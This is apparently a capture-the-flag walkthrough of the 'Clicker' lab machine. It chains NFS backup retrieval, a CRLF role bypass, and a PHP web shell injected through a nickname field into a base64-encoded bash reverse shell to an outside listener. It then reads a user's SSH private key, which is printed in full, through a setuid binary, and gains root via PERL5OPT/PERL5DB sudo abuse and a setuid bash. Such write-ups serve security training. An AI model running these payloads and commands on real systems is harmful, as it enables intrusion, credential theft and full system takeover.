# Clicker
#activemachine 
#medium
#web 
#php 
#rpc
#nfs
#decompile
#perl
### Reconnaissance
The first phase of the penetration test involved reconnaissance to gather information about the target system. Nmap was used to scan the target system and identify open ports and services. The results showed that the system had 4 open ports, including port 22 (SSH), port 80 (HTTP), port 111 (RPC), and port 2049 (NFS).

The following commands were used for reconnaissance `nmap -sC -v $TARGET`, here we have the original output:

```
Nmap scan report for clicker.htb (10.10.11.232)
Host is up (0.050s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89d7393458a0eaa1dbc13d14ec5d5a92 (ECDSA)
|_  256 b4da8daf659cbbf071d51350edd81130 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Clicker - The Game
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38677/tcp6  mountd
|   100005  1,2,3      40905/tcp   mountd
|   100005  1,2,3      43230/udp6  mountd
|   100005  1,2,3      51072/udp   mountd
|   100021  1,3,4      33509/tcp   nlockmgr
|   100021  1,3,4      44613/tcp6  nlockmgr
|   100021  1,3,4      47269/udp6  nlockmgr
|   100021  1,3,4      57091/udp   nlockmgr
|   100024  1          36933/tcp   status
|   100024  1          38680/udp6  status
|   100024  1          39205/tcp6  status
|   100024  1          51520/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
### RPC && NFS Services
We start by checking out what services can be run with the remote procedure call , to do so we run `rpcinfo -p $TARGET`
```
program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  35365  mountd
    100005    1   tcp  38765  mountd
    100005    2   udp  38794  mountd
    100005    2   tcp  50911  mountd
    100005    3   udp  51072  mountd
    100024    1   udp  51520  status
    100024    1   tcp  36933  status
    100005    3   tcp  40905  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049
    100021    1   udp  57091  nlockmgr
    100021    3   udp  57091  nlockmgr
    100021    4   udp  57091  nlockmgr
    100021    1   tcp  33509  nlockmgr
    100021    3   tcp  33509  nlockmgr
    100021    4   tcp  33509  nlockmgr
```

It seems that we could possibly use the NFS to mount some part of the server inside our local machine, so we list all the available mounts with `showmount -e $TARGET`
```
Export list for 10.10.11.232:
/mnt/backups *
```
Since we found a mount point we can mount it on our local machine with `sudo mount -t nfs ${TARGET}:/mnt/backups /mnt/a`
Once is mounted we check the contents `ls /mnt/a`
```
total 2,2M
-rw-r--r-- 1 root root 2,2M sep  1 22:27 clicker.htb_backup.zip
```
As it is a zip we unzip it and check again the contents `unzip clicker.htb_backup.zip && ls`
```
total 56K
-rw-rw-r-- 1 localuser localuser 3,9K sep  1 22:18 admin.php
drwxr-xr-x 1 localuser localuser   76 feb 28  2023 assets
-rw-rw-r-- 1 localuser localuser  608 sep  1 22:17 authenticate.php
-rw-rw-r-- 1 localuser localuser  541 sep  1 22:17 create_player.php
-rw-rw-r-- 1 localuser localuser 2,5K sep  1 22:18 db_utils.php
-rw-r--r-- 1 localuser localuser 1,4K sep  1 22:18 diagnostic.php
-rw-rw-r-- 1 localuser localuser 2,0K sep  1 22:18 export.php
drwxr-xr-x 1 localuser localuser    0 sep  1 22:18 exports
-rw-rw-r-- 1 localuser localuser 3,8K sep  1 22:18 index.php
-rw-rw-r-- 1 localuser localuser 3,4K sep  1 22:18 info.php
-rw-rw-r-- 1 localuser localuser 3,3K sep  1 22:18 login.php
-rw-rw-r-- 1 localuser localuser   74 sep  1 22:17 logout.php
-rw-rw-r-- 1 localuser localuser 3,3K sep  1 22:17 play.php
-rw-rw-r-- 1 localuser localuser 3,0K sep  1 22:17 profile.php
-rw-rw-r-- 1 localuser localuser 3,3K sep  1 22:18 register.php
-rw-rw-r-- 1 localuser localuser  563 sep  1 22:18 save_game.php
```
We have all the source code of the running website, now we can start performing the website exploration.
### Web Application Analysis
If we try to enter the IP as URL, it gets set to `http://clicker.htb/`, so we add it as to our `/etc/hosts` with the command `echo "${TARGET} clicker.htb" | sudo tee -a /etc/hosts`. Now if we reload the website it will load properly, this web allow us to login and to register so we do both, once we are in we can check our private user data in the profile area where a table with our data will be shown, in the home tab we can see custom messages by modifying the URL like `http://clicker.htb/index.php?msg=hi`

As we already have the source code, we check if we can exploit this `cat index.php | grep msg`
```
<h5 class="float-md-start mb-0" style="color:green;" name="msg"><?php echo $_GET['msg']; ?></h5>
```
We can perform a XSS with `http://clicker.htb/index.php?msg=<script>alert('XSS')</script>`, but we cannot use this to run system commands so we keep searching.

Another feature of the website is letting us play to a minigame and save it, so we check the save source contents `cat save_game.php`
```
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	$args = [];
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
	save_profile($_SESSION['PLAYER'], $_GET);
	// update session info
	$_SESSION['CLICKS'] = $_GET['clicks'];
	$_SESSION['LEVEL'] = $_GET['level'];
	header('Location: /index.php?msg=Game has been saved!');
	
}
?>
```
`cat db_utils.php`
```
function save_profile($player, $args) {
	global $pdo;
  	$params = ["player"=>$player];
	$setStr = "";
  	foreach ($args as $key => $value) {
    		$setStr .= $key . "=" . $pdo->quote($value) . ",";
	}
  	$setStr = rtrim($setStr, ",");
  	$stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
  	$stmt -> execute($params);
}
```

The previous code will iterate through all the URL parameters saving them in the database with the exception of a parameter exactly called `role`, to surpass this restriction in order to modify our role we can perform a CRLF to trick the code that performs the check into thinking there isn't a field called role even if it is, to do so we go to burpsuite as we need to modify the save request before it reaches the server, we intercept the saving game request and modify the url like `GET /save_game.php?clicks=3&level=0&role%0a=Admin`. After login out and login back in we get access to the admin panel.

Now in the admin panel we have the ranking, which can be saved as file, we try to do this and once the file is saved it can be accessed as a URL like `/exports/top_players_a94nj1ze.txt`, we can potentially exploit this so we repeat it and intercept the request inside the we see this `threshold=1000000&extension=txt`, we can modify the extension of the file as we wish so we save it as PHP.

Now we are able to run PHP code but first we need to inject the malicious code, so we check all the available fields to inject it, inside the files there are 3 fields nickname, clicks and level. If we check `authentication.php` we find there is a field called nickname, so as done before we can use the save game request to modify the data about our user so we modify our nickname to run commands
We repeat the previous process to save game modifying the request so the new URL is `GET /save_game.php?clicks=3&level=0&nickname=<?php+system($_GET['cmd']);?>`.
```
Nickname: <?php system($_GET['cmd']);?> Clicks: 3 Level: 0
Nickname: admin Clicks: 999999999999999999 Level: 999999999
Nickname: ButtonLover99 Clicks: 10000000 Level: 100
Nickname: Paol Clicks: 2776354 Level: 75
Nickname: Th3Br0 Clicks: 87947322 Level: 1
```
Now if we save again the ranking but modifying the request so its PHP and we go to the new tab with http://clicker.htb/exports/top_players_hfxvps48.php?cmd=id, we are finally able to run commands

|Nickname|Clicks|Level|
|---|---|---|
|uid=33(www-data) gid=33(www-data) groups=33(www-data)|3|0|
|admin|999999999999999999|999999999|
|ButtonLover99|10000000|100|
|Paol|2776354|75|
|Th3Br0|87947322|1|

The next step is to get a reverse shell, to do so we encode the command in base 64 with `echo 'bash -c bash -i >&/dev/tcp/10.10.14.60/4444 0>&1' | base64`, after encoding it looks like `YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYxCg==`
The whole command we need to run to get the reverse shell is `echo "YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYxCg=="|base64 -d|bash;`
Before executing it in the web server we open the local listener `nc -lvnp 4444`, once set we enter the following URL to start the shell `http://clicker.htb/exports/top_players_959ywzep.php?cmd=echo "YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNjAvNDQ0NCAwPiYxCg=="|base64 -d|bash;`

The first step in the shell is upgrade it with  `python3 -c 'import pty;pty.spawn("/bin/bash")'`
### Lateral movement
As we are a service user, we now need to become a normal user, there is one called `jack`
We search for any euid commads with `find / -perm -4000 2>/dev/null`
```
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query
```
The one in `/opt/manage` seems suspicious so we can investigate it, `cd /opt/manage && ls`
```
README.txt  execute_query
```
`cat README.txt`
```
Web application Management

Use the binary to execute the following task:
	- 1: Creates the database structure and adds user admin
	- 2: Creates fake players (better not tell anyone)
	- 3: Resets the admin password
	- 4: Deletes all users except the admin
```
As we don't see any useful information in the readme and we don't want to lose our shell we download the binary to investigate it in local, we can copy it with scp or a HTTP python server it doesn't matter. Once we have it in local, we can de-compile it with ghidra, to get the following code.
```c++
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  undefined8 uVar2;
  char *pcVar3;
  size_t sVar4;
  size_t sVar5;
  char *__dest;
  long in_FS_OFFSET;
  undefined8 local_98;
  undefined8 local_90;
  undefined4 local_88;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
    sVar5 = strlen(pcVar3);
    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,(char *)&local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      local_78 = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
      local_68 = 0x656b63696c632075;
      local_60 = 0x6573755f62645f72;
      local_58 = 0x737361702d2d2072;
      local_50 = 0x6c63273d64726f77;
      local_48 = 0x62645f72656b6369;
      local_40 = 0x726f77737361705f;
      local_38 = 0x6b63696c63202764;
      local_30 = 0x203c20762d207265;
      local_28 = 0;
      sVar4 = strlen((char *)&local_78);
      sVar5 = strlen(pcVar3);
      pcVar3 = (char *)calloc(sVar5 + sVar4 + 1,1);
      strcat(pcVar3,(char *)&local_78);
      strcat(pcVar3,__dest);
      system(pcVar3);
    }
    else {
      puts("File not readable or not found");
    }
    uVar2 = 0;
  }
LAB_001015e1:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
We have a binary which allow us to read any file we want to as the user `jack`, to use this first we need to know how to get to the / directory so later we can search for SSH keys or other things, after testing a while we get this `./execute_query 5 ../../../etc/passwd`, ok now we know how far we are from / so we can get a SSH key with `./execute_query 5 ../.ssh/id_rsa`
```
-----BEGIN OPENSSH PRIVATE KEY---
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
-----END OPENSSH PRIVATE KEY---
```
If we save that to a file `key` with perms `0600`, then we can run `ssh -i key jack@$TARGET` to enter as `jack` without the need of knowing the password. Once inside we get our user flag `cat user.txt`
```
2077ff5ceadbf060fd24cfc1557986b0
```
### Privilege escalation
The next step is to get command execution as root, so we check our ids looking for something strange and also the commands we are allowed to run as `root`, to do this `id && sudo -l`
```
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```
Again we have a strange script which maybe can be exploited so we read it `cat /opt/monitor.sh`
```
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```
This first script calls another suspicious one so we also check that one, `cat /usr/bin/xml_pp`

```perl
#!/usr/bin/perl -w
# $Id: /xmltwig/trunk/tools/xml_pp/xml_pp 32 2008-01-18T13:11:52.128782Z mrodrigu  $
use strict;

use XML::Twig;
use File::Temp qw/tempfile/;
use File::Basename qw/dirname/;

my @styles= XML::Twig->_pretty_print_styles; # from XML::Twig
my $styles= join '|', @styles;               # for usage
my %styles= map { $_ => 1} @styles;          # to check option

my $DEFAULT_STYLE= 'indented';

my $USAGE= "usage: $0 [-v] [-i<extension>] [-s ($styles)] [-p <tag(s)>] [-e <encoding>] [-l] [-f <file>] [<files>]";

# because of the -i.bak option I don't think I can use one of the core
# option processing modules, so it's custom handling and no clusterization :--(


my %opt= process_options(); # changes @ARGV

my @twig_options=( pretty_print  => $opt{style},
                   error_context => 1,
                 );
if( $opt{preserve_space_in})
  { push @twig_options, keep_spaces_in => $opt{preserve_space_in};}

if( $opt{encoding})
  { push @twig_options, output_encoding  => $opt{encoding};
  }
else
  { push @twig_options, keep_encoding => 1; }

# in normal (ie not -l) mode tags are output as soon as possible
push @twig_options, twig_handlers => { _all_ => sub { $_[0]->flush } }
  unless( $opt{load});

if( @ARGV)
  { foreach my $file (@ARGV)
      { print STDERR "$file\n" if( $opt{verbose});

        my $t= XML::Twig->new( @twig_options);

        my $tempfile;
        if( $opt{in_place})
          { (undef, $tempfile)= tempfile( DIR => dirname( $file)) or die "cannot create tempfile for $file: $!\n" ;
            open( PP_OUTPUT, ">$tempfile") or die "cannot create tempfile $tempfile: $!";
            select PP_OUTPUT;
          }
        $t= $t->safe_parsefile( $file);

        if( $t)
          { if( $opt{load}) { $t->print; }

            select STDOUT;

            if( $opt{in_place})
              { close PP_OUTPUT;
                my $mode= mode( $file);
                if( $opt{backup})  
                  { my $backup= backup( $file, $opt{backup});
                    rename( $file, $backup) or die "cannot create backup file $backup: $!"; 
                  }
                rename( $tempfile, $file) or die "cannot overwrite file $file: $!";
                if( $mode ne mode( $file)) { chmod $mode, $file or die "cannot set $file mode to $mode: $!"; }
              }

          }
        else
          { if( defined $tempfile)
              { unlink $tempfile or die "cannot unlink temp file $tempfile: $!"; }
            die $@;
          }
      }
  }
else
  { my $t= XML::Twig->new( @twig_options);
    $t->parse( \*STDIN); 
    if( $opt{load}) { $t->print; }
  }

 
sub mode
  { my( $file)= @_;
    return (stat($file))[2];
  }
 
sub process_options
  { my %opt; 
    while( @ARGV && ($ARGV[0]=~ m{^-}) )
      { my $opt= shift @ARGV;
        if(    ($opt eq '-v') || ($opt eq '--verbose') ) 
          { die $USAGE if( $opt{verbose});
            $opt{verbose}= 1;
          }
        elsif( ($opt eq '-s') || ($opt eq '--style') )  
          { die $USAGE if( $opt{style});
            $opt{style}= shift @ARGV;
            die $USAGE unless( $styles{$opt{style}});
          }
        elsif( ($opt=~ m{^-i(.*)$}) || ($opt=~ m{^--in_place(.*)$}) )
          { die $USAGE if( $opt{in_place});
            $opt{in_place}= 1;
            $opt{backup}= $1 ||'';
          }
        elsif( ($opt eq '-p') || ($opt eq '--preserve') )  
          { my $tags= shift @ARGV;
            my @tags= split /\s+/, $tags;
            $opt{preserve_space_in} ||= [];
            push @{$opt{preserve_space_in}}, @tags;
          }
        elsif( ($opt eq '-e') || ($opt eq '--encoding') ) 
          { die $USAGE if( $opt{encoding});
            $opt{encoding}= shift @ARGV;
          }
        elsif( ($opt eq '-l') || ($opt eq '--load'))
          { die $USAGE if( $opt{load});
            $opt{load}=1;
          }
       elsif( ($opt eq '-f') || ($opt eq '--files') ) 
         { my $file= shift @ARGV;
           push @ARGV, files_from( $file);
          }
        elsif( ($opt eq '-h') || ($opt eq '--help'))  
         { system "pod2text", $0; exit; }
        elsif( $opt eq '--')  
         { last;       }
        else
         { die $USAGE; }
      }

    $opt{style} ||= $DEFAULT_STYLE;

    return %opt;
  }

# get the list of files (one per line) from a file
sub files_from
  { my $file= shift;
    open( FILES, "<$file") or die "cannot open file $file: $!";
    my @files;
    while( <FILES>) { chomp; push @files, $_; }
    close FILES;
    return @files;
  }

sub backup
  { my( $file, $extension)= @_;
    my $backup;
    if( $extension=~ m{\*})
      { ($backup= $extension)=~ s{\*}{$file}g; }
    else
      { $backup= $file.$extension; }
    return $backup;
  }
  
__END__

=head1 NAME

xml_pp - xml pretty-printer

=head1 SYNOPSYS

xml_pp [options] [<files>]

=head1 DESCRIPTION

XML pretty printer using XML::Twig

=head1 OPTIONS

=over 4

=item -i[<extension>]

edits the file(s) in place, if an extension is provided (no space between 
C<-i> and the extension) then the original file is backed-up with that extension

The rules for the extension are the same as Perl's (see perldoc perlrun): if
the extension includes no "*" then it is appended to the original file name,
If the extension does contain one or more "*" characters, then each "*" is 
replaced with the current filename.

=item -s <style>

the style to use for pretty printing: none, nsgmls, nice, indented, record, or
record_c (see XML::Twig docs for the exact description of those styles), 
'indented' by default

=item -p <tag(s)> 

preserves white spaces in tags. You can use several C<-p> options or quote the 
tags if you need more than one

=item -e <encoding>

use XML::Twig output_encoding (based on Text::Iconv or Unicode::Map8 and 
Unicode::String) to set the output encoding. By default the original encoding
is preserved. 

If this option is used the XML declaration is updated (and created if there was
none).

Make sure that the encoding is supported by the parser you use if you want to
be able to process the pretty_printed file (XML::Parser does not support 
'latin1' for example, you have to use 'iso-8859-1')

=item -l

loads the documents in memory instead of outputting them as they are being
parsed.

This prevents a bug (see L<BUGS|bugs>) but uses more memory

=item -f <file>

read the list of files to process from <file>, one per line

=item -v 

verbose (list the current file being processed)

=item --

stop argument processing (to process files that start with -)

=item -h

display help

=back

=head1 EXAMPLES

  xml_pp foo.xml > foo_pp.xml           # pretty print foo.xml 
  xml_pp < foo.xml > foo_pp.xml         # pretty print from standard input

  xml_pp -v -i.bak *.xml                # pretty print .xml files, with backups
  xml_pp -v -i'orig_*' *.xml            # backups are named orig_<filename>

  xml_pp -i -p pre foo.xhtml            # preserve spaces in pre tags
  
  xml_pp -i.bak -p 'pre code' foo.xml   # preserve spaces in pre and code tags
  xml_pp -i.bak -p pre -p code foo.xml  # same

  xml_pp -i -s record mydb_export.xml   # pretty print using the record style

  xml_pp -e utf8 -i foo.xml             # output will be in utf8
  xml_pp -e iso-8859-1 -i foo.xml       # output will be in iso-8859-1

  xml_pp -v -i.bak -f lof               # pretty print in place files from lof
  
  xml_pp -- -i.xml                      # pretty print the -i.xml file

  xml_pp -l foo.xml                     # loads the entire file in memory 
                                        # before pretty printing it

  xml_pp -h                             # display help

=head1 BUGS

Elements with mixed content that start with an embedded element get an extra \n 

  <elt><b>b</b>toto<b>bold</b></elt>

will be output as 

  <elt>
    <b>b</b>toto<b>bold</b></elt>

Using the C<-l> option solves this bug (but uses more memory)

=head1 TODO

update XML::Twig to use Encode with perl 5.8.0

=head1 AUTHOR

Michel Rodriguez <mirod@xmltwig.com>
```
As the .sh calls a Perl script we can abuse this by using environment variables that make Perl run in debugger mode which allow us to run commands, this is known as ''perl_startup'' privilege escalation, to do so we run this `sudo PERL5OPT=-d PERL5DB='exec "ls /root"' /opt/monitor.sh`
```
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
	(Maybe you meant system() when you said exec()?)
diagnostic_files  restore  root.txt
```
As we are able to run commands as root we get ourselfs a root terminal with `sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh`, then as the `bash` is now with euid we can run it as root with `bash -p`, the -p indicates to use privilege mode, we check that it worked `whoami`
```
root
```
And finally we get the last flag `cat /root/root.txt`
```
f4673dcfcf908ba3b3e5a01f352598ab
```